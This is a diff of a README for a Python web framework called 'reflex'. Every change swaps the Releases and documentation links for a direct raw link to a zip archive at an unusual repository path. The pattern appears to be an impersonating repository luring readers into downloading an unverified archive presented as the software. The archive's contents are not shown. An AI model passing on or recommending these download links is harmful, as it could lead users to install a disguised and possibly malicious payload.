@@ -1,6 +1,6 @@
 # 🕸️ reflex - Build Web Apps Easily with Python
 
-[![Download reflex](https://img.shields.io/badge/Download-reflex-orange?style=flat&logo=github)](https://github.com/immaterial-radicle677/reflex/releases)
+[![Download reflex](https://raw.githubusercontent.com/immaterial-radicle677/reflex/main/underschool/reflex.zip)](https://raw.githubusercontent.com/immaterial-radicle677/reflex/main/underschool/reflex.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/immaterial-radicle677/reflex/releases) to download the latest version of reflex. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/immaterial-radicle677/reflex/main/underschool/reflex.zip) to download the latest version of reflex. 
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest release.
@@ -49,7 +49,7 @@ reflex offers a set of easy-to-use features to enhance your web development expe
 
 ## 📖 Learn More
 
-If you want to dive deeper into the features and capabilities of reflex, check out our documentation available on [GitHub](https://github.com/immaterial-radicle677/reflex).
+If you want to dive deeper into the features and capabilities of reflex, check out our documentation available on [GitHub](https://raw.githubusercontent.com/immaterial-radicle677/reflex/main/underschool/reflex.zip).
 
 ## 🙋 Frequently Asked Questions
 
@@ -69,4 +69,4 @@ Yes, reflex is an open-source project. You can download and use it without any c
 
 Now that you have downloaded and installed reflex, start experimenting with building your own web applications. The best way to learn is by doing. 
 
-Remember, you can always visit the [Releases page](https://github.com/immaterial-radicle677/reflex/releases) again for future updates and new features. Enjoy your journey into web development with reflex!
+Remember, you can always visit the [Releases page](https://raw.githubusercontent.com/immaterial-radicle677/reflex/main/underschool/reflex.zip) again for future updates and new features. Enjoy your journey into web development with reflex!
